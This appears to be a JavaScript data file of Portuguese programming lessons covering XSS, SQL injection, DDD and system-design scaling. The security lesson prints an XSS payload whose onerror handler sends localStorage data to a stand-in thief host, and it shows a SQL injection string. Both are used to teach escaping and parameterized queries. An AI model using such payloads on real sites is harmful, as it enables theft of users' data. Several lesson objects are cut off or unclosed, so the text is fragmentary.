{ id:"seguranca", nivel:"Especialista", ico:"🛡️", min:30,
  titulo:"Segurança: XSS, injection e segredos",
  resumo:"As 3 falhas que derrubam CRUDs — incluindo uma que existe NESTE app, de propósito.",
  corpo:`
<h3>🎯 O que você vai aprender</h3>
<ul>
  <li><b>XSS</b>: quando o dado do usuário vira código — e onde este app se arrisca</li>
  <li><b>SQL Injection</b> e a defesa definitiva (queries parametrizadas)</li>
  <li>Gestão de <b>segredos</b> e as regras de ouro de autenticação</li>
</ul>
<h3>📖 Conceito</h3>
<p>Segurança de CRUD se resume a uma frase: <b>nunca confie em dado que veio do usuário</b>. Nem no formulário, nem na URL, nem no que está salvo no banco (pode ter sido gravado por um atacante).</p>
<h3>💻 XSS — e a confissão deste app</h3>
<pre class="code">// Este app renderiza assim (lição DOM):
el.innerHTML = "&lt;h3&gt;" + tarefa.titulo + "&lt;/h3&gt;";

// E se o usuário criar uma tarefa com este "título"?
//   &lt;img src=x onerror="fetch('https://ladrao.com?roubo='+localStorage.amos2)"&gt;
// O navegador EXECUTA. Isso é XSS: dado virou código.

// Defesa 1: escapar antes de inserir
function esc(s){
  return String(s).replace(/&/g,"&amp;amp;").replace(/&lt;/g,"&amp;lt;")
                  .replace(/&gt;/g,"&amp;gt;").replace(/"/g,"&amp;quot;");
}
el.innerHTML = "&lt;h3&gt;" + esc(tarefa.titulo) + "&lt;/h3&gt;";

// Defesa 2 (melhor p/ texto puro): nem usar innerHTML
el.textContent = tarefa.titulo;   // trata TUDO como texto, nunca como código</pre>
<p>Por que aqui o risco é baixo? App local, dados só seus, sem outros usuários. Mas no momento em que virar multiusuário (lição 🚀), o título que <b>outro</b> usuário digitou roda no <b>seu</b> navegador. Frameworks como React/Angular escapam por padrão — mais um motivo para a migração.</p>
<h3>💻 SQL Injection — o clássico</h3>
<pre class="code">// NUNCA: colar input do usuário na query
db.query("SELECT * FROM tasks WHERE titulo = '" + busca + "'");
// busca = "x' OR '1'='1"  →  devolve TODAS as tarefas de TODOS

// SEMPRE: query parametrizada — o banco trata o valor como DADO
db.query("SELECT * FROM tasks WHERE titulo = $1", [busca]);</pre>
<h3>🔑 Regras de ouro (o resto do essencial)</h3>
<ul>
  <li>Senhas: nunca em texto puro — <code>bcrypt</code>/<code>argon2</code> (hash lento, com salt)</li>
  <li>Segredos: variáveis de ambiente / secrets do CI — jamais no código (lição 🔀)</li>
  <li>Autorização em TODA rota: "estar logado" ≠ "poder editar a tarefa dos outros"</li>
  <li>HTTPS sempre; valide no servidor mesmo que já valide na tela</li>
</ul>

{ id:"ddd", nivel:"Especialista", ico:"🏛️", min:35,
  titulo:"DDD: o domínio no centro",
  resumo:"Linguagem ubíqua, entidades, agregados e bounded contexts — usando ESTE app como domínio.",
  corpo:`
<h3>🎯 O que você vai aprender</h3>
<ul>
  <li><b>Linguagem ubíqua</b>: o vocabulário do negócio dentro do código</li>
  <li><b>Entidades, value objects e agregados</b> — modelando as regras, não só os dados</li>
  <li><b>Bounded contexts</b>: onde um modelo termina e outro começa</li>
</ul>
<h3>📖 Conceito</h3>
<p>Domain-Driven Design (Eric Evans, 2003) parte de uma observação: sistemas apodrecem quando o código fala uma língua e o negócio fala outra. A proposta: descobrir a <b>linguagem ubíqua</b> do domínio e fazer o código usá-la literalmente. Neste app, o domínio é "aprendizado adaptativo" e a linguagem é: <i>Tarefa, Revisão, Ciclo, Streak, Sprint, Competência, Prova pública</i>. Repare que o código já usa esses nomes — isso é DDD embrionário.</p>
<p>Os blocos de construção: <b>Entidade</b> tem identidade que persiste (uma Tarefa continua ela mesma após editar o título — por isso o <code>id</code>). <b>Value object</b> é definido pelo valor (a data "2026-07-09" não tem identidade). <b>Agregado</b> é um grupo com um chefe — a raiz — que protege as regras de consistência: ninguém mexe nas partes por fora.</p>
<h3>💻 Código: o agregado Tarefa com invariantes</h3>
<pre class="code">// ANTES (como este app faz): dados nus, regras espalhadas
// qualquer função pode fazer t.status = "done" e ESQUECER a revisão

// DEPOIS (DDD): a regra mora DENTRO do modelo
class Tarefa {
  #status = "backlog";              // # = privado: só a classe mexe

  constructor(id, titulo, topico){
    if(!titulo?.trim()) throw new Error("Tarefa exige título");
    this.id = id; this.titulo = titulo; this.topico = topico;
  }

  concluir(agenda){                 // a ÚNICA porta para "done"
    if(this.#status === "done")
      throw new Error("Tarefa já concluída");
    this.#status = "done";
    agenda.agendarRevisao(this.topico);   // INVARIANTE: concluir
  }                                        // SEMPRE agenda revisão
  get status(){ return this.#status; }
}

// Impossível concluir sem agendar. Impossível concluir duas vezes.
// A regra de negócio virou INQUEBRÁVEL, não uma convenção.</pre>
<h3>🗺️ Bounded contexts: as fronteiras deste app</h3>
<p>Olhe a sidebar — ela desenha os contextos: <b>Planejamento</b> (Hoje/Backlog: Tarefa, plano diário), <b>Avaliação</b> (Exercícios: Quiz, score), <b>Progressão</b> (XP, streak, nível) e <b>Carreira</b> (provas públicas, prontidão). "Tarefa" significa coisas diferentes em cada um — no Planejamento tem prazo; na Progressão é só fonte de XP. DDD diz: <b>não force um modelo único</b>; deixe cada contexto ter o seu e traduza nas fronteiras. É daí que nascem os microsserviços — um serviço por contexto, quando (e se) a escala pedir.</p>
<div class="onde">🔍 <b>Onde está neste app:</b> os contextos já existem como grupos de funções: <code>planejarHoje</code>/<code>reabastecerBacklog</code> (Planejamento), <code>renderQuiz</code>/<code>corrigir</code> (Avaliação), <code>nivelXP</code>/<code>atualizarStreak</code> (Progressão). Refatorar para agregados é o desafio.</div>
<div class="desafio">🏆 <b>Desafio:</b> escreva a classe <code>Streak</code> com método <code>registrarAtividade(data)</code> que encapsula TODA a regra da lição de gamificação. Teste: deve ser impossível, por fora, deixar o streak num estado inválido.</div>` },

<h3>🎯 O que você vai aprender</h3>

  <li>Trade-offs: consistência × disponibilidade, latência × custo</li>

<h3>📖 Conceito</h3>
<p>System design é a arte de responder "e se 1 milhão de pessoas usarem?" <b>sem</b> construir para 1 milhão no dia 1. Vamos escalar este app em 4 estágios, usando tudo das lições anteriores:</p>
<h3>💻 Estágio 0 → hoje: 1 usuário</h3>
<pre class="code">[navegador: HTML + localStorage]
Custo: R$0 · Falha possível: limpar o cache (por isso o backup 💾)</pre>
<h3>💻 Estágio 1: 100–10 mil usuários</h3>
<pre class="code">[navegador] ⇄ [API Node em Docker] ⇄ [PostgreSQL]
                      +
              [login JWT · HTTPS]
1 servidor de ~R$30/mês aguenta. A maioria dos SaaS MORRE aqui
por falta de clientes, não de servidores. Não pule estágios.</pre>
<h3>💻 Estágio 2: 10 mil–500 mil</h3>
<pre class="code">           [CDN — o HTML/JS estático perto do usuário]
                          |
[Load Balancer] → [API ×3 réplicas SEM estado (a sessão vive no JWT,
                          |            não no servidor — por isso escala)]
                  [PostgreSQL primário] → [réplica de LEITURA]
                          |
                  [Redis: cache do plano do dia — 90% dos GETs nem

<h3>💻 Estágio 3: 500 mil–1 milhão+</h3>
<pre class="code">tudo do estágio 2, mais:
[Fila (RabbitMQ/SQS)] — correção por IA vira trabalho ASSÍNCRONO:

  (Lembra do async/await? Filas são async/await entre SERVIDORES.)
[Particionamento] — usuários 1–500k no banco A, resto no B
[Observabilidade] — logs estruturados, métricas, alertas às 3h da manhã</pre>
<h3>⚖️ Os trade-offs (o que separa sênior de júnior na entrevista)</h3>
<ul>
  <li><b>Cache</b> = velocidade × dado possivelmente velho. Plano do dia pode atrasar 60s? Pode. Saldo bancário? Não.</li>
